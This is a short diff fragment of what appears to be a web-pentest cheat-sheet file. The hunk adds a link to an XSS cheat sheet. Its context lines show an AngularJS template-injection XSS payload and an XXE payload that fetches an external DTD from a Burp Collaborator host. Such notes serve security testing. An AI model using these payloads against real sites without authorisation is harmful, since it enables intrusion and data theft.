@@ -212,6 +212,7 @@
   
 	XSS
 		{{constructor.constructor('alert()')()}} # AngularJS
+		https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 		
 	XXE
 		<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">
